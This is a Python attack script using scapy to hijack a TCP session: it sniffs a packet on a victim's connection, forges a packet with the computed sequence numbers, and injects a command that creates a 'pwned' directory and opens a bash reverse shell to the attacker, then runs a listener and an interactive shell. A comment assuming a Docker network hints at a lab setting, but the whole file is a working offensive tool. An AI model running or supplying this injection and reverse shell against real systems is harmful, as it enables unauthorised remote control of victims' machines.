#!/usr/bin/env python3
import sys
import time
import threading
import socket
from scapy.all import sniff, IP, TCP, Raw, send

# Default reverse-shell listener port on attacker
LISTENER_PORT = 4444


def grab_packet(src_ip, dst_ip, dst_port, timeout=30):
    """
    Sniff a single packet on the TCP flow from src_ip -> dst_ip:dst_port.
    """
    bpf = f"tcp and src host {src_ip} and dst host {dst_ip} and dst port {dst_port}"
    print("waiting for packet...")
    pkts = sniff(filter=bpf, count=1, timeout=timeout)
    if not pkts:
        sys.exit("[!] Timeout waiting for packet. Is the victim sending data?")
    return pkts[0]


def inject_payload(src_ip, dst_ip, dst_port, seq, ack, attacker_ip, attacker_port):
    """
    Forge and send a TCP packet to run both mkdir and reverse shell back to us.
    """
    payload = (
        "mkdir -p /home/user/pwned; "
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\n"
    )

    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(
        sport=sniffed_pkt[TCP].sport,
        dport=dst_port,
        seq=seq,
        ack=ack,
        flags="PA"
    )
    pkt = ip / tcp / Raw(load=payload)
    send(pkt, verbose=False)
    print("[*] Injection sent: mkdir + reverse shell payload.")


def start_listener(port):
    """
    Start a simple reverse-shell listener on attacker.
    Returns the accepted socket.
    """
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    print(f"Received reverse shell connection from ")  # placeholder
    conn, addr = srv.accept()
    print(f"Received reverse shell connection from {addr}")
    return conn


def interactive_shell(conn):
    """
    Simple interactive loop: send commands, print output.
    """
    conn.settimeout(1.0)
    try:
        while True:
            cmd = input("$ ")
            if not cmd:
                continue
            conn.sendall((cmd + "\n").encode())
            time.sleep(0.2)
            data = b""
            try:
                while True:
                    part = conn.recv(4096)
                    if not part:
                        break
                    data += part
            except socket.timeout:
                pass
            print(data.decode(errors="ignore"), end="")
    except (KeyboardInterrupt, BrokenPipeError):
        print("\n[*] Connection closed.")


if __name__ == "__main__":
    # Expect exactly three arguments
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <src_ip> <dst_ip> <dst_port>")
        sys.exit(1)

    src_ip   = sys.argv[1]
    dst_ip   = sys.argv[2]
    dst_port = int(sys.argv[3])

    # Determine attacker IP (assumes Docker network)
    attacker_ip = socket.gethostbyname(socket.gethostname())

    # 1) Start listener thread on fixed port
    result = {}
    def run_listener():
        result['conn'] = start_listener(LISTENER_PORT)

    listener = threading.Thread(target=run_listener, daemon=True)
    listener.start()
    time.sleep(1)

    # 2) Sniff one packet from victim flow
    sniffed_pkt = grab_packet(src_ip, dst_ip, dst_port)

    # 3) Compute injection seq/ack
    orig_seq = sniffed_pkt[TCP].seq
    payload_len = len(bytes(sniffed_pkt[TCP].payload))
    inject_seq = orig_seq + payload_len
    inject_ack = sniffed_pkt[TCP].ack

    # 4) Send injection (mkdir + reverse shell)
    inject_payload(src_ip, dst_ip, dst_port, inject_seq, inject_ack,
                   attacker_ip, LISTENER_PORT)

    # 5) Wait for connection and interactive
    listener.join(timeout=60)
    conn = result.get('conn')
    if not conn:
        sys.exit("[!] Did not receive reverse shell connection.")

    interactive_shell(conn)
